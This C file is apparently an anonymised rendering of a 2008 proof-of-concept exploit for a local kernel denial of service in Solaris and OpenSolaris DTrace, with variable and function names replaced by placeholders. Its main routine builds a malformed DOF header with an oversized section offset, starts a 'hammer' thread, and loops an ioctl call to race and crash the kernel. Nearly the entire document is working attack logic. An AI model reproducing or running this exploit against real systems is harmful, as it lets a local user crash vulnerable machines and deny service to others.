
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct dof_hdr {int dofh_secsize; int dofh_secnum; int dofh_secoff; int dofh_loadsz; void** dofh_ident; } ;


 void* VAR_0 ;
 void* VAR_1 ;
 void* VAR_2 ;
 size_t VAR_3 ;
 size_t VAR_4 ;
 size_t VAR_5 ;
 size_t VAR_6 ;
 size_t VAR_7 ;
 size_t VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 void* VAR_11 ;
 void* VAR_12 ;
 int VAR_13 ;
 char* VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int FUNC_0 (int) ;
 int VAR_18 ;
 int FUNC_1 (int ,char*,...) ;
 int VAR_19 ;
 int FUNC_2 (int,int ,struct dof_hdr*) ;
 int FUNC_3 (void***,int ,int ) ;
 int FUNC_4 (struct dof_hdr*,int ,int) ;
 int FUNC_5 (char*,int ) ;
 int FUNC_6 (char*,...) ;
 int FUNC_7 (int*,int *,int ,struct dof_hdr*) ;
 int VAR_20 ;

int
FUNC_8 (int VAR_21, char **VAR_22)
{
  union {
    struct dof_hdr hdr;
    unsigned char buf[256*1024];
  } VAR_23;
  struct dof_hdr *VAR_24;
  int VAR_25, VAR_26, VAR_27, VAR_28;

  FUNC_6 ("Solaris >= 10/Opensolaris local kernel DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  VAR_26 = FUNC_5 (VAR_14, VAR_17);
  if (VAR_26 < 0)
    {
      FUNC_1 (VAR_20, "failed opening %s\n", VAR_14);
      return (VAR_15);
    }

  VAR_24 = &VAR_23.hdr;
  FUNC_4 (VAR_24, 0, sizeof *VAR_24);

  FUNC_3 (&VAR_24->dofh_ident, VAR_9, VAR_10);
  VAR_24->dofh_ident[VAR_7] = VAR_11;
  VAR_24->dofh_ident[VAR_6] = VAR_2;
  VAR_24->dofh_ident[VAR_8] = VAR_12;
  VAR_24->dofh_ident[VAR_5] = VAR_12;
  VAR_24->dofh_ident[VAR_3] = VAR_0;
  VAR_24->dofh_ident[VAR_4] = VAR_1;
  VAR_24->dofh_secsize = 1024;
  VAR_24->dofh_secnum = 1024;
  VAR_24->dofh_secoff = 0x7fffffffffff0000;

  VAR_27 = FUNC_7 (&VAR_28, ((void*)0), VAR_19, VAR_24);
  if (VAR_27 < 0)
    {
      FUNC_1 (VAR_20, "failed creating hammer thread\n");
      return (VAR_15);
    }

  for (VAR_25 = 0; ; VAR_25++)
    {
      VAR_24->dofh_loadsz = sizeof VAR_23 / 2;
      VAR_27 = FUNC_2 (VAR_26, VAR_13, VAR_24);
      FUNC_0 (VAR_27 == -1);

      if (!(VAR_25 % 64))
        FUNC_6 ("tried %d-times, %d-changes\r", VAR_25, VAR_18);
    }


  return (VAR_16);
}
